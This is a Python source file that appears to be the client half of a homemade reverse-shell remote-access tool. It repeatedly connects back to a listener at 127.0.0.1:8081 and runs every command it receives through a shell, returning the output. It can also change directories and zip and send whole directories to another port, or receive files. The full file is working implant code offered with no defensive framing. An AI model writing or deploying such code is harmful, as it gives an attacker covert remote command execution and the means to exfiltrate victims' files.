import socket
import time
import subprocess
import os
import zipfile

ip = "127.0.0.1"
port = 8081


def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"\n[!] Connection received.\n")
            return s
        except socket.error as e:
            print("Connection error:", e)
            time.sleep(10)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                break
            if data[:-1].decode() == "/exit":
                s.close()
                break
            else:
                cmd(s, data[:-1].decode())
    except Exception as e:
        print("Error in listen:", e)

def cmd(s, data):
    try:
        if data.startswith("help"):
            help_text = """\n##########

Manual:
execute - to execute commands;
cd - to change directory;
ls or dir - to list files;
ipconfig or ifconfig - to see IP addresses.
Download - Download mode for files from the server(make shure you are using the client.py file listening on 8888);
Upload - to upload files from your computer(make shure you are using the server.py on the same port and address).

##########\n\n"""
            send_data(s, help_text)

        elif data.startswith("execute"):
            command = data.split(" ", 1)[1]
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

        elif data.startswith("cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Directory changed successfully.\n")

        elif data.startswith("Download"):
            send_data(s, "\n[!] Trying connection with the client on port 8888...\n")
            server()

        elif data.startswith("Upload"):
            send_data(s,"\n[!] Trying connection with the server...\n")
            client_path()

        else:
            output = subprocess.run(data, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

    except Exception as e:
        print("Error in cmd:", e)


def send_data(s, data):
    s.send(data.encode())

def compactar_diretorio(diretorio, arquivo_saida):
    with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
        for raiz, _, arquivos in os.walk(diretorio):
            for arquivo in arquivos:
                caminho_completo = os.path.join(raiz, arquivo)
                relativo = os.path.relpath(caminho_completo, diretorio)
                zipf.write(caminho_completo, relativo)

def client_path():
    try:
        while True:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


            client.connect(('127.0.0.1', 8889))
            print('Connected [!]\n')

            directory_name = input('Enter the directory to zip> ')
            client.send(directory_name.encode())

            with open('received_file.zip', 'wb') as file:
                while True:
                    data = client.recv(4096)
                    if not data:
                        break
                    file.write(data)

            print(f'File received as received_file.zip [ok]')
            client.close()
            break
    except ConnectionRefusedError as e:
        print("Connection error: ", e)
    except Exception as e:
        print("Connection error: ", e)

def server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('127.0.0.1', 8888))
    server.listen(1)

    print('Waiting for a connection...')
    connection, address = server.accept()
    print(f'Connection from {address}')

    diretorio_cliente = connection.recv(1024).decode()

    if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
        print(f"Directory '{diretorio_cliente}' does not exist or is not a directory.")
        connection.close()
        server.close()
        exit()

    arquivo_zip_saida = 'arquivo_enviado.zip'
    compactar_diretorio(diretorio_cliente, arquivo_zip_saida)

    if os.path.getsize(arquivo_zip_saida) == 0:
        print(f"Failed to create ZIP file for directory '{diretorio_cliente}'.")
        connection.close()
        server.close()
        exit()

    with open(arquivo_zip_saida, 'rb') as file:
        while True:
            data = file.read(4096)
            if not data:
                break
            connection.sendall(data)

    print('ZIP file sent.')
    server.close()


def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                listen(s_connected)
            else:
                print("Connection was wrong, trying again.")
        except Exception as e:
            print("Main error: ", e)
            time.sleep(10)

if __name__ == "__main__":
    main()
